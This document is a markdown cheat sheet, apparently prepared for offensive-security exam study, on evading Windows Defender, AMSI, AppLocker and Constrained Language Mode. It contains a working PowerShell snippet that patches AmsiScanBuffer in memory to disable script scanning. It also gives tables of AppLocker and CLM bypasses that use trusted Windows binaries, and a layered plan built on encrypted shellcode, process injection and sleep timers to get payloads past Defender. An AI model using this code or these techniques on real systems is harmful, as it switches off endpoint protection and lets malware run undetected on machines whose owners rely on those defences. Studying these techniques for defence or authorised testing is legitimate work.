---
name: "AV/EDR Evasion — AMSI, AppLocker, CLM Bypass"
description: "Comprehensive guide to bypassing Windows Defender, AMSI, AppLocker, and Constrained Language Mode (CLM) covering signature-based, heuristic, and behavioral evasion techniques."
tags: [av-evasion, edr-evasion, amsi-bypass, applocker-bypass, clm-bypass, windows-defender]
---

# AV/EDR Evasion Techniques

## AV Detection Methods

| Method | Description | Bypass Difficulty |
|--------|-------------|-------------------|
| **Signature-based** | Byte pattern matching | Easy |
| **Heuristic** | Behavioral analysis | Medium |
| **Dynamic (sandbox)** | Execute di sandbox | Hard |

## Locating Signatures

```bash
ThreatCheck.exe -f payload.exe
# Output: offset where signature was found
```

## AMSI Bypass — 6 Methods

| Method | Approach | Reliability |
|--------|----------|-------------|
| 1 | `amsiInitFailed` reflection | High |
| 2 | AmsiContext nulling | High |
| 3 | AmsiScanBuffer memory patch | High |
| 4 | Registry disable (JScript) | Medium |
| 5 | Custom RunSpace (C#) | High |
| 6 | Frida hook / WinDbg patch | Low (research) |

### Method 3 — AmsiScanBuffer Patch (Most Reliable)

```powershell
$amsi = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE('amsi.dll')
$export = [System.Runtime.InteropServices.Marshal]::GetProcAddress($amsi, 'AmsiScanBuffer')
$patch = [Byte[]]@(0x31, 0xC0, 0xC3)  # xor eax, eax + ret
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $export, 3)
```

## CLM Bypass — 5 Methods

| Method | Technique |
|--------|-----------|
| 1 | Interactive RunSpace |
| 2 | InstallUtil + .NET |
| 3 | msbuild compile inline |
| 4 | regsvr32 .sct |
| 5 | PowerShell -version 2 |

## AppLocker Bypass — 7 Methods

| Method | Binary |
|--------|--------|
| 1 | `InstallUtil.exe` |
| 2 | `msbuild.exe` |
| 3 | `cscript.exe` / `wscript.exe` |
| 4 | `rundll32.exe` |
| 5 | `regsvr32.exe` |
| 6 | `psexec.exe` |
| 7 | `bginfo.exe` |

## Defender Evasion Layered Strategy

```
Layer 1: Encrypted shellcode (XOR/AES)
Layer 2: Custom loader
Layer 3: Process injection/hollowing
Layer 4: Sleep timer + decoy
Layer 5: AMSI bypass
Layer 6: AppLocker bypass
```

## Best Practices

- Jangan pernah taruh shellcode plaintext di source code
- Selalu gunakan sleep timer sebelum injection
- Siapkan minimal 3 AMSI bypass methods berbeda
- Test payload di Windows Defender sebelum exam
